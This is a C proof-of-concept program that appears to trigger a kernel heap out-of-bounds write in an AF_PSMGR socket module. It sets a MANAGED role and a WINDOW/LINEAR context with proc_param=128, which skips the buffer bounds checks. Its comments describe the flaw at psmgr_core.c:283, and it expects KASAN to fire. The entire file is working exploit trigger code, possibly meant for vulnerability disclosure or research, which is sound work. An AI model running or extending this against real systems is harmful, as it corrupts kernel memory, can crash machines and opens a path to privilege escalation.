#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <stdint.h>

#define AF_PSMGR             46
#define SOCK_SEQPACKET        5
#define PSMGR_SOL           282
#define PSMGR_OPT_SET_ROLE    1
#define PSMGR_OPT_LOCAL_CTX   4
#define PSMGR_ROLE_MANAGED 0x01
#define PSMGR_XFRM_WINDOW  0x02
#define PSMGR_MODE_LINEAR  0x01
#define PSMGR_MSG_DATA     0x05

struct sockaddr_psmgr { uint16_t family; uint32_t id; };
struct psmgr_local_ctx { uint8_t xfrm_type; uint8_t enc_mode; uint16_t window_sz; uint32_t proc_param; };
struct psmgr_msghdr    { uint8_t msg_type; uint8_t session_id_lo; uint16_t payload_len; uint32_t seq; };

int main(void) {
    int fd;
    struct sockaddr_psmgr addr = { AF_PSMGR, 1 };
    uint8_t role = PSMGR_ROLE_MANAGED;
    /* WINDOW+LINEAR: out_offset = proc_param
     * proc_param=128 -> out_offset=128 = PSMGR_BUF_DATA_SZ
     * MANAGED skips global PSMGR_BUF_TOTAL_SZ check
     * WINDOW case has no bounds check -> heap OOB at psmgr_core.c:283 */
    struct psmgr_local_ctx ctx = { PSMGR_XFRM_WINDOW, PSMGR_MODE_LINEAR, 0, 128 };
    struct psmgr_msghdr hdr    = { PSMGR_MSG_DATA, 1, 16, 1 };
    uint8_t payload[16];
    uint8_t buf[sizeof(hdr) + sizeof(payload)];

    memset(payload, 0xAA, sizeof(payload));

    printf("[*] socket\n");
    fd = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd < 0) { perror("socket"); return 1; }

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) { perror("bind"); return 1; }
    printf("[+] bound\n");

    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) { perror("set_role"); return 1; }
    printf("[+] role=MANAGED\n");

    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_LOCAL_CTX, &ctx, sizeof(ctx)) < 0) { perror("local_ctx"); return 1; }
    printf("[+] ctx: WINDOW/LINEAR/proc_param=128 -> out_offset=128\n");

    memcpy(buf, &hdr, sizeof(hdr));
    memcpy(buf + sizeof(hdr), payload, sizeof(payload));

    printf("[*] sending DATA -> triggering OOB at psmgr_core.c:283\n");
    if (write(fd, buf, sizeof(buf)) < 0) { perror("write"); return 1; }
    printf("[+] done - KASAN should have fired\n");

    close(fd);
    return 0;
}
